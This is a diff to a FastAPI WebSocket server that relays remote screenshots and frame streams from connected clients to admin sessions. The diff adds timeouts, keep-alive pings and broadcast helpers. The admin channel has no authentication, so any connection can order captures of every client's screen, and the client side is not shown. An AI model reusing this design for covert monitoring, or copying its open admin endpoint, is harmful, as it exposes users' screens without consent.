@@ -2,6 +2,7 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from typing import Dict
 import random
 import json
+import asyncio
 
 app = FastAPI()
 
@@ -35,62 +36,52 @@ async def client_ws(websocket: WebSocket):
     clients[client_id] = websocket
     
     # Send ID to client
-    await websocket.send_json({
-        "type": "id_assigned",
-        "client_id": client_id
-    })
+    try:
+        await websocket.send_json({
+            "type": "id_assigned",
+            "client_id": client_id
+        })
+    except:
+        clients.pop(client_id, None)
+        return
     
     print(f"✅ Client {client_id} connected")
     
     # Notify all admins about new client
-    for admin in admins:
-        try:
-            await admin.send_json({
-                "type": "client_list",
-                "clients": list(clients.keys())
-            })
-        except:
-            pass
+    await broadcast_client_list()
     
     try:
         while True:
-            data = await websocket.receive_text()
-            
-            # If it's a ping, ignore
-            if data == "ping":
-                continue
-            
-            # If client sends image -> forward to all admins
-            for admin in admins:
+            try:
+                # Set timeout for receiving data
+                data = await asyncio.wait_for(websocket.receive_text(), timeout=60.0)
+                
+                # If it's a ping, ignore
+                if data == "ping":
+                    continue
+                
+                # If client sends image -> forward to all admins
+                await broadcast_to_admins({
+                    "type": "screenshot",
+                    "client_id": client_id,
+                    "image": data
+                })
+                
+            except asyncio.TimeoutError:
+                # Send ping to check if client is alive
                 try:
-                    await admin.send_json({
-                        "type": "screenshot",
-                        "client_id": client_id,
-                        "image": data
-                    })
+                    await websocket.send_text("ping")
                 except:
-                    pass
+                    break
 
     except WebSocketDisconnect:
+        pass
+    except Exception as e:
+        print(f"⚠️ Client {client_id} error: {e}")
+    finally:
         clients.pop(client_id, None)
         print(f"❌ Client {client_id} disconnected")
-        
-        # Notify all admins about disconnection immediately
-        disconnected_admins = []
-        for admin in admins[:]:  # Use slice to iterate over copy
-            try:
-                await admin.send_json({
-                    "type": "client_list",
-                    "clients": list(clients.keys())
-                })
-            except Exception as e:
-                # Remove disconnected admin
-                disconnected_admins.append(admin)
-        
-        # Clean up disconnected admins
-        for admin in disconnected_admins:
-            if admin in admins:
-                admins.remove(admin)
+        await broadcast_client_list()
 
 
 # =========================
@@ -103,33 +94,92 @@ async def admin_ws(websocket: WebSocket):
     print("👤 Admin connected")
     
     # Send current client list to newly connected admin
-    await websocket.send_json({
-        "type": "client_list",
-        "clients": list(clients.keys())
-    })
+    try:
+        await websocket.send_json({
+            "type": "client_list",
+            "clients": list(clients.keys())
+        })
+    except:
+        admins.remove(websocket)
+        return
     
     try:
         while True:
-            data = await websocket.receive_json()
+            try:
+                data = await asyncio.wait_for(websocket.receive_json(), timeout=60.0)
 
-            # data = {"action": "take_photo", "client_id": "1234"}
-            # or data = {"action": "stream_frame", "client_id": "1234", "quality": "medium"}
-            if data.get("action") == "take_photo":
-                client_id = data.get("client_id")
-                if client_id in clients:
-                    await clients[client_id].send_text("take_photo")
-                    print(f"📸 Screenshot requested for client {client_id}")
-            
-            elif data.get("action") == "stream_frame":
-                client_id = data.get("client_id")
-                quality = data.get("quality", "medium")
-                if client_id in clients:
-                    await clients[client_id].send_json({
-                        "action": "stream_frame",
-                        "quality": quality
-                    })
-
+                # data = {"action": "take_photo", "client_id": "1234"}
+                # or data = {"action": "stream_frame", "client_id": "1234", "quality": "medium"}
+                if data.get("action") == "take_photo":
+                    client_id = data.get("client_id")
+                    if client_id in clients:
+                        try:
+                            await clients[client_id].send_text("take_photo")
+                            print(f"📸 Screenshot requested for client {client_id}")
+                        except:
+                            pass
+                
+                elif data.get("action") == "stream_frame":
+                    client_id = data.get("client_id")
+                    quality = data.get("quality", "medium")
+                    if client_id in clients:
+                        try:
+                            await clients[client_id].send_json({
+                                "action": "stream_frame",
+                                "quality": quality
+                            })
+                        except:
+                            pass
+                            
+            except asyncio.TimeoutError:
+                # Send ping to keep connection alive
+                try:
+                    await websocket.send_json({"type": "ping"})
+                except:
+                    break
 
     except WebSocketDisconnect:
-        admins.remove(websocket)
+        pass
+    except Exception as e:
+        print(f"⚠️ Admin error: {e}")
+    finally:
+        if websocket in admins:
+            admins.remove(websocket)
         print("👤 Admin disconnected")
+
+
+# =========================
+# HELPER FUNCTIONS
+# =========================
+async def broadcast_client_list():
+    """Broadcast updated client list to all admins"""
+    message = {
+        "type": "client_list",
+        "clients": list(clients.keys())
+    }
+    
+    disconnected_admins = []
+    for admin in admins:
+        try:
+            await admin.send_json(message)
+        except:
+            disconnected_admins.append(admin)
+    
+    # Clean up disconnected admins
+    for admin in disconnected_admins:
+        if admin in admins:
+            admins.remove(admin)
+
+async def broadcast_to_admins(message):
+    """Broadcast message to all admins"""
+    disconnected_admins = []
+    for admin in admins:
+        try:
+            await admin.send_json(message)
+        except:
+            disconnected_admins.append(admin)
+    
+    # Clean up disconnected admins
+    for admin in disconnected_admins:
+        if admin in admins:
+            admins.remove(admin)
